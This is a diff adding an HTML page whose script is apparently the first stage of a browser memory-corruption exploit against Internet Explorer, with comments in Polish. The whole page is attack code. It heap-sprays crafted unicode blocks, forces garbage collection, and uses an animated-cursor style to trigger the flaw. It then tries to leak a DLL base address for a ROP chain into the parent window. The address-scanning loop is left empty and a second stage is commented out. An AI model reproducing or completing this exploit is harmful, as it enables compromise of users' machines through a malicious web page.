@@ -1,0 +1,89 @@
+<html>
+<meta id='set'>
+<script type="text/javascript">
+
+/* Stage 1 - ret2lib - eip-part = 0x2bc2 
+   eax = LoadLibabryW('....');
+   mov dword ptr [ebp - 0x418], eax
+   ... shity code ...
+   ... call by ordinals ...
+   ... continuable exception ...
+*/
+
+var hold = document.getElementById('set');
+
+function heaps() {
+
+  CollectGarbage();
+
+  var code = unescape('%u0a3c%u0a0a') + //shity 
+             'ms'+                      //moglibysmy zaladowac dowolna biblioteke 
+             'vc'+                      //bo zapiszemy sobie adres bazowy
+             'r7'+                      //ale dla tej gotowy jest ropChain wiec nie bedziemy sie juz bardziej torturowac
+             '1.'+
+             'dl'+
+             'l' + 
+             unescape('%u0000')       +
+             unescape('%u0a4c%u0a0a') + //[ebp + 8] - pointer to unicode string msvcr71.dll 
+             unescape('%ubaba%ueeee') +
+             unescape('%u0a38%u0a0a') +   
+             unescape('%u0001%u0000');  
+
+    while (code.length < 100000)
+        code = code + code;
+
+    var block = code.substr(0, 64*1024/2);
+
+    for (i=0; i<14; i++) {
+        block += code.substr(0, 64*1024/2);
+    }
+
+    block += code.substr(0, (64*1024/2)-(38/2));
+
+    var heaps = new Array();
+
+    for (i=0; i<120; i++) {
+        heaps[i] = block.substr(0, block.length);
+    }
+
+
+  hold.setAttribute('skwokdowkdokwod',heaps);
+}
+
+
+function baseSearch() {   /* w ktoryms z bloków jest base adres, musimy go jakos sprytnie znalexc */
+      
+       base = 0;
+       mem  = hold.getAttribute('skwokdowkdokwod');
+       for(i=0;i<120;i++) {     /* musimy sobie przeskanowac te 120 wielkich blokow bo gdzies tu jest adres bazowy dll */
+               
+              //alert(escape(mem[i].toString(16)));
+               
+       }
+      
+       return base;
+}
+
+function msg() {  /* w tym momencie mamy base adres biblioteki w pamieci */
+
+   baseOf = baseSearch();
+   
+   parent.window.baseDll = baseOf;  /* zapiszmy go w oknie nadrzednym */
+
+   hold.setAttribute('skwokdowkdokwod',null);
+   hold.removeAttribute('skwokdowkdokwod');
+   CollectGarbage();
+
+   //window.location = 's2.html';
+
+}
+
+heaps();
+
+</script>
+</meta>
+<body id='expme' style="CURSOR: url('original.ani')" onload='msg();'>
+
+
+</body>
+</html>
